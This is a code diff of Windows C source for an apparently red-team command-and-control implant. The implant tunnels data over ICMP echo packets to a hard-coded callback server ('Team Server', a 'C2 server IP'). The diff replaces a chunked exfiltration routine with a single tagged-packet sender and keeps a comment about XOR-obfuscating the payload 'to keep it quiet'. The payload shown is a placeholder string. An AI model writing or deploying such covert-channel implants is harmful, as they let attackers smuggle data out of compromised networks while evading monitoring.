@@ -117,19 +117,14 @@ passes data to Team Server
 #include <stdio.h>
 #include <winsock2.h>
 #include <windows.h>
-#include <stdint.h>
 
 #define ICMP_ECHO 8
 #define ICMP_ECHOREPLY 0
 //size of payload/data section of icmp.
 //ideally, the program will do the math & figure out how to chunk messages based on this size. Currently, it does not
-#define ICMP_PAYLOAD_SIZE 16 // in Bytes - 32 is windows standard, 52 is linux. Min of 13, 12 for overhead, 1 for data. 
-                             //Can set up to 15000 unfragmented, which is the MTU (1472  due to 8 bytes of ICMP header + 20 of on the wire)
-#define PACKET_SIZE (8 + ICMP_PAYLOAD_SIZE) // this does NOT include the 20 bytes for IPV4 overhead. Add 20 for a grand total
+#define ICMP_PAYLOAD_SIZE 32
 #define ICMP_CALLBACK_SERVER "172.19.89.43"
 #define ICMP_TAG "RQ47"
-#define CHUNK_OVERHEAD 12 // how many bytes are needed each chunk to calculate chunk stuff
-#define CHUNK_DATA_SIZE (ICMP_PAYLOAD_SIZE - CHUNK_OVERHEAD)
 
 struct icmp_header {
     BYTE Type;
@@ -155,103 +150,53 @@ USHORT checksum(USHORT* buffer, int size) {
     return (USHORT)(~cksum);
 }
 
-// Send ICMP Echo Request, Not Chunked
-//int send_icmp(SOCKET s, struct sockaddr_in* dest) {
-//    char packet[PACKET_SIZE] = { 0 };
-//
-//    struct icmp_header* icmp = (struct icmp_header*)packet;
-//    icmp->Type = ICMP_ECHO;
-//    icmp->Code = 0;
-//    icmp->ID = (USHORT)GetCurrentProcessId();
-//    icmp->Sequence = 1;
-//
-//
-//    //tagless version
-//    //char* data = packet + sizeof(struct icmp_header);
-//    //strcpy_s(data, ICMP_PAYLOAD_SIZE, "ShmingusBingus");
-//
-//    //tagged version
-//    char* data = packet + sizeof(struct icmp_header);
-//    const char* tag = ICMP_TAG; //4 byte tag
-//    const char* real_data = "ShmingusBingus"; // payload
-//
-//    // Combine TAG + DATA into buffer safely
-//    snprintf(data, ICMP_PAYLOAD_SIZE, "%s%s", tag, real_data);
-//
-//    icmp->Checksum = 0;
-//    icmp->Checksum = checksum((USHORT*)packet, sizeof(packet));
-//
-//    printf("[+] Sending ICMP Echo Request...\n");
-//
-//    /*
-//    EX: XOR payload, or do whatever to keep it quiet/obsfuctated, here
-//
-//    encrypt_payload(&payload);
-//
-//    */
-//
-//    int result = sendto(s, packet, sizeof(packet), 0, (SOCKADDR*)dest, sizeof(*dest));
-//    if (result == SOCKET_ERROR) {
-//        printf("[-] sendto failed: %d\n", WSAGetLastError());
-//        return -1;
-//    }
-//
-//    printf("[+] Packet sent. Dump:\n");
-//    printf("    Type: %d\n", icmp->Type);
-//    printf("    Code: %d\n", icmp->Code);
-//    printf("    ID: %d\n", ntohs(icmp->ID));
-//    printf("    Seq: %d\n", ntohs(icmp->Sequence));
-//    printf("    Payload: %s\n", data);
-//
-//    return 0;
-//}
+// Send ICMP Echo Request
+int send_icmp(SOCKET s, struct sockaddr_in* dest) {
+    char packet[60] = { 0 };
 
-
-
-int send_chunked(SOCKET s, struct sockaddr_in* dest, const char* full_data, int full_data_len) {
-    int total_chunks = (full_data_len + CHUNK_DATA_SIZE - 1) / CHUNK_DATA_SIZE;
-
-    char packet[PACKET_SIZE] = { 0 };
     struct icmp_header* icmp = (struct icmp_header*)packet;
-    char* payload = packet + sizeof(struct icmp_header);
+    icmp->Type = ICMP_ECHO;
+    icmp->Code = 0;
+    icmp->ID = (USHORT)GetCurrentProcessId();
+    icmp->Sequence = 1;
 
-    for (int i = 0; i < total_chunks; ++i) {
-        memset(packet, 0, sizeof(packet));
 
-        icmp->Type = ICMP_ECHO;
-        icmp->Code = 0;
-        icmp->ID = htons((USHORT)GetCurrentProcessId());
-        icmp->Sequence = htons(i + 1); // optional tracking
+    //tagless version
+    //char* data = packet + sizeof(struct icmp_header);
+    //strcpy_s(data, ICMP_PAYLOAD_SIZE, "ShmingusBingus");
 
-        // [TAG][chunk_index (4 bytes)][total_chunks (4 bytes)][DATA]
-        memcpy(payload, ICMP_TAG, 4);  // 4-byte tag
+    //tagged version
+    char* data = packet + sizeof(struct icmp_header);
+    const char* tag = ICMP_TAG; //4 byte tag
+    const char* real_data = "ShmingusBingus"; // payload
 
-        uint32_t index_net = htonl(i);
-        uint32_t total_net = htonl(total_chunks);
-        memcpy(payload + 4, &index_net, 4); //copy in chunk index
-        memcpy(payload + 8, &total_net, 4); //copy in total chunks
-        //data comes after
+    // Combine TAG + DATA into buffer safely
+    snprintf(data, ICMP_PAYLOAD_SIZE, "%s%s", tag, real_data);
 
-        int chunk_size = CHUNK_DATA_SIZE;
-        if (i == total_chunks - 1) {
-            chunk_size = full_data_len - i * CHUNK_DATA_SIZE;
-        }
+    icmp->Checksum = 0;
+    icmp->Checksum = checksum((USHORT*)packet, sizeof(packet));
 
-        memcpy(payload + 12, full_data + (i * CHUNK_DATA_SIZE), chunk_size);
+    printf("[+] Sending ICMP Echo Request...\n");
 
-        icmp->Checksum = 0;
-        icmp->Checksum = checksum((USHORT*)packet, sizeof(packet));
+    /*
+    EX: XOR payload, or do whatever to keep it quiet/obsfuctated, here
 
-        int packet_len = sizeof(struct icmp_header) + 12 + chunk_size;
-        int result = sendto(s, packet, packet_len, 0, (SOCKADDR*)dest, sizeof(*dest));
-        if (result == SOCKET_ERROR) {
-            printf("[-] sendto failed at chunk %d: %d\n", i, WSAGetLastError());
-            return -1;
-        }
+    encrypt_payload(&payload);
 
-        printf("[+] Sent chunk %d/%d (%d bytes data)\n", i + 1, total_chunks, chunk_size);
-        Sleep(50); // delay to prevent flooding
+    */
+
+    int result = sendto(s, packet, sizeof(packet), 0, (SOCKADDR*)dest, sizeof(*dest));
+    if (result == SOCKET_ERROR) {
+        printf("[-] sendto failed: %d\n", WSAGetLastError());
+        return -1;
     }
+
+    printf("[+] Packet sent. Dump:\n");
+    printf("    Type: %d\n", icmp->Type);
+    printf("    Code: %d\n", icmp->Code);
+    printf("    ID: %d\n", ntohs(icmp->ID));
+    printf("    Seq: %d\n", ntohs(icmp->Sequence));
+    printf("    Payload: %s\n", data);
 
     return 0;
 }
@@ -321,13 +266,7 @@ int main() {
     dest.sin_family = AF_INET;
     dest.sin_addr.s_addr = inet_addr(SERVER_IP);  // Replace with your C2 server IP
 
-    // if (send_icmp(s, &dest) == 0) {
-    //     recv_icmp(s);
-    // }
-    const char* real_data = "ShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingusShmingusBingus"; // payload
-    size_t data_len = strlen(real_data);
-    //SOCKET s, struct sockaddr_in* dest, const char* full_data, int full_data_len
-    if (send_chunked(s, &dest, real_data, data_len) == 0) {
+    if (send_icmp(s, &dest) == 0) {
         recv_icmp(s);
     }
 
